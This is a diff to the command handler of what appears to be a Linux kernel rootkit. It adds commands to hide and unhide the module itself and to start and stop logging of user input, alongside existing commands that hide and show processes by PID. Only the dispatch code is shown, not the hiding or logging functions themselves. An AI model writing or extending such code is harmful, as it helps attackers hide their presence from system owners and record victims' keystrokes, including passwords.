@@ -8,6 +8,8 @@
 #include "communication.h"
 #include "processHider.h"
 #include "hideProcEntry.h"
+#include "moduleHide.h"
+#include "logInput.h"
 #include "common.h"
 
 static void handleCommand(char *input);
@@ -81,7 +83,7 @@ static ssize_t receiveWrite(struct file *file, const char *userBuffer, size_t le
 	}
 	kernelBuffer[len] = '\0';
 
-	printInfo("%s", kernelBuffer);
+	printInfo("%s-", kernelBuffer);
 
 	handleCommand(kernelBuffer);
 
@@ -92,10 +94,23 @@ static ssize_t receiveWrite(struct file *file, const char *userBuffer, size_t le
 
 static void handleCommand(char *input) {
 	int arg;
+	char *newline;
 
+	newline = strchr(input, '\n');
+	if (newline != NULL) {
+		*newline = '\0';
+	}
 	if (sscanf(input, "hidePid %d", &arg) == 1) {
 		hideProcess(arg);
 	} else if (sscanf(input, "showPid %d", &arg) == 1) {
 		showProcess(arg);
+	} else if (!strcmp(input, "showMod")) {
+		moduleHide_stop();
+	} else if (!strcmp(input, "hideMod")) {
+		moduleHide_start();
+	} else if (!strcmp(input, "startLog")) {
+		logInput_init();
+	} else if (!strcmp(input, "stopLog")) {
+		logInput_exit();
 	}
 }
